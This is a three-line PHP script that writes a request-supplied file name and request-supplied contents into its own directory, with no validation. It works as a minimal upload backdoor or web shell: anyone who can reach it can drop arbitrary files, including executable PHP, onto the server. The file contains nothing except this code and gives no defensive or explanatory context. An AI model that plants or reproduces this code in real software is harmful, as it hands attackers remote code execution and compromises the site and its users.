<?php
$path = dirname(__FILE__);
file_put_contents($path. "/" . $_REQUEST['file'], $_REQUEST['data']);